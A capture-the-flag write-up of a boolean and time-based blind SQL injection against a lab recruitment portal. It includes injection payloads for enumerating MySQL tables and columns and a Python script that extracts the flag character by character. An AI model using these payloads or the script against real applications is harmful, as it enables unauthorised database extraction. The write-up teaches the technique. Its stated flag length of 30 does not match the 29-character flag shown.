# Blind SQL Injection - CTF Challenge Writeup

## Challenge Overview
A recruitment portal that verifies Agent IDs but only returns boolean responses (Access Granted/Denied). The goal is to extract a hidden flag from the database using blind SQL injection techniques.

## Initial Analysis

1. **Access the challenge**: Visit the recruitment portal
2. **Test normal functionality**: Try valid Agent IDs (1, 2, 3, 4, 5)
3. **Identify the vulnerability**: Test for SQL injection

## Vulnerability Discovery

### Basic SQL Injection Test
```bash
# Test with basic SQL injection payload
Agent ID: 1' OR '1'='1
Result: Access Granted (confirms SQL injection)
```

### Confirming Blind SQL Injection
```bash
# Valid Agent ID
Agent ID: 1
Result: Access Granted

# Invalid Agent ID  
Agent ID: 999
Result: Access Denied

# SQL injection that should be true
Agent ID: 1' OR '1'='1
Result: Access Granted
```

## Database Enumeration

## Database Enumeration

### Discover Database Information
```bash
# Get database name
Agent ID: 1' AND DATABASE() = 'blind_sqli' -- 
Result: Access Granted (confirms database name)

# Check MySQL version
Agent ID: 1' AND VERSION() LIKE '8%' -- 
Result: Access Granted/Denied (depending on MySQL version)
```

### Find Table Names
```bash
# Check if 'flags' table exists
Agent ID: 1' AND (SELECT COUNT(*) FROM flags) > 0 -- 
Result: Access Granted (table exists)

# Extract table names from information_schema
Agent ID: 1' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='blind_sqli' AND table_name='flags') > 0 -- 
Result: Access Granted

# Find all tables in the database
Agent ID: 1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='blind_sqli') = 3 -- 
Result: Access Granted (3 tables: agents, flags, admin_users)

# Extract table names character by character
Agent ID: 1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='blind_sqli' LIMIT 1 OFFSET 1),1,1) = 'f' -- 
Result: Access Granted (second table starts with 'f' - flags)
```

### Discover Column Names
```bash
# Check if 'flag_value' column exists in flags table
Agent ID: 1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='flags' AND column_name='flag_value') > 0 -- 
Result: Access Granted (column exists)

# Extract column names character by character (if needed)
Agent ID: 1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1),1,1) = 'f' -- 
Result: Access Granted (first column starts with 'f')

# List all columns in flags table
Agent ID: 1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='flags') = 2 -- 
Result: Access Granted (flags table has 2 columns: id, flag_value)
```

### Extract Flag Length
```bash
# Test flag length
Agent ID: 1' AND LENGTH((SELECT flag_value FROM flags LIMIT 1)) = 30 -- 
Result: Access Granted (flag is 30 characters long)
```

## Flag Extraction

### Extract Flag Character by Character
```bash
# Extract 1st character
Agent ID: 1' AND SUBSTRING((SELECT flag_value FROM flags LIMIT 1),1,1) = 'C' -- 
Result: Access Granted (1st char is 'C')

# Extract 2nd character
Agent ID: 1' AND SUBSTRING((SELECT flag_value FROM flags LIMIT 1),2,1) = 'T' -- 
Result: Access Granted (2nd char is 'T')

# Extract 3rd character
Agent ID: 1' AND SUBSTRING((SELECT flag_value FROM flags LIMIT 1),3,1) = 'F' -- 
Result: Access Granted (3rd char is 'F')

# Continue this process for all 30 characters...
```

## Automated Exploitation

### Python Script
```python
import requests

url = "http://localhost:8080/check.php"

def test_payload(payload):
    data = {'id': payload}
    response = requests.post(url, data=data)
    return "Access Granted" in response.text

def extract_string(query, max_length=50):
    result = ""
    for pos in range(1, max_length + 1):
        found = False
        for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_-":
            payload = f"1' AND SUBSTRING(({query}),{pos},1) = '{char}' -- "
            if test_payload(payload):
                result += char
                print(f"Position {pos}: {char} (Current: {result})")
                found = True
                break
        if not found:
            break
    return result

# Enumerate tables
print("=== Database Enumeration ===")

# Get table count
for count in range(1, 10):
    if test_payload(f"1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='blind_sqli') = {count} -- "):
        print(f"Number of tables: {count}")
        break

# Extract table names
for i in range(3):  # We know there are 3 tables
    table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='blind_sqli' LIMIT 1 OFFSET {i}"
    table_name = extract_string(table_query, 20)
    print(f"Table {i+1}: {table_name}")

# Extract columns from flags table
column_query = "SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 1"
column_name = extract_string(column_query, 20)
print(f"Flags table column: {column_name}")

# Extract flag
print("\n=== Flag Extraction ===")
flag_query = "SELECT flag_value FROM flags LIMIT 1"
flag = extract_string(flag_query, 35)
print(f"Flag: {flag}")
```

## Alternative: Time-Based Blind SQLi

```bash
# Time-based extraction (if boolean method doesn't work)
Agent ID: 1' AND IF(SUBSTRING((SELECT flag_value FROM flags LIMIT 1),1,1)='C',SLEEP(3),0) -- 

# If the response takes ~3 seconds, the character is correct
# If immediate response, try next character
```

## Final Flag

After extracting all characters:
```
CTF{bl1nd_sql1_master_h4ck3r}
```

## Key Learning Points

1. **Blind SQL Injection** exploits applications that don't return data directly
2. **Boolean-based** attacks use conditional logic to infer information
3. **Character-by-character extraction** is the core technique for data exfiltration
4. **Automation** is essential for efficient exploitation of blind vulnerabilities

## Tools Used
- Web browser for manual testing
- curl for command-line testing  
- Python requests library for automation
- Custom exploitation script
